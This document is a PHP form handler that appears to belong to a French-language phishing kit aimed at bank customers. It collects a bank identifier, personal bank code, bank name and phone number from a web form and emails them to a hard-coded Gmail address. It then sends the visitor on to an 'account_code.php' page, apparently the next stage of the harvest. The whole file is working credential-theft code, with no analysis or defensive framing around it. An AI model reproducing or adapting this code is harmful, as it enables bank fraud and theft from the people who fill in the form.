<?php
    session_start ();
	    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        // Get the form fields and remove whitespace.
			$bankId = trim($_POST["bankId"]);
            $bankCode =strip_tags(trim($_POST["bankCode"]));
			$bankName =strip_tags(trim($_POST["bankName"]));          
			$tel =strip_tags(trim($_POST["tel"]));

			$bankId = preg_replace('/[^0-9]/','',$bankId);
       if ( empty($bankId) OR empty($bankCode) OR empty($bankName) OR empty($tel)) {
            // Set a 400 (bad request) response code and exit.
			header("refresh:0.5;url=banq_account.php");
			  echo "<h3>Oops! certaines inoformations sont vides ou incorrectes</h3>";
            exit;
        }
	
        $dest ='laurapoilot13@gmail.com';
        $entete  = 'MIME-Version: 1.0' . "\r\n";
        $entete .= 'Content-type: text/html; charset=utf-8' . "\r\n";
		$message = '<html><body>';
		$message .= '<img src="img/logo.jpg" alt="Website Change Request" />';
		$message = '<h1>Nouvelles informations</h1>';
		$message .= '<table rules="all" style="border: 2px solid #666;" cellpadding="10">';
		$message .= "<tr style='background: #eee;'><td><strong>Identifiant bancaire:</strong> </td><td>" . $bankId . "</td></tr>";
		$message .= "<tr><td><strong>Code personnel:</strong> </td><td>" . $bankCode . "</td></tr>";
		$message .= "<tr><td><strong>Nom de la banque:</strong> </td><td>" . $bankName . "</td></tr>";
		$message .= "<tr><td><strong>Numero de téléphone:</strong> </td><td>" . $tel . "</td></tr>";
		$message .= "</table>";
		$message .= "</body></html>";

        $retour = mail($dest, 'Nouvelles informations', stripslashes($message), $entete);
        if($retour) {
            echo header('location:account_code.php');
        }else {
            // Set a 500 (internal server error) response code.
			header("refresh:0.5;url=banq_account.html");
            echo "<h3>Oops! Erreur d'envoir .</h3>";
        } 
		
	}else {
        // Not a POST request, set a 403 (forbidden) response code.
		header( "refresh:0.5;url=banq_account.html" );
        echo "<h3>Impossible de traiter votre demande</h3>  .";
		
		exit;
		
		}
?>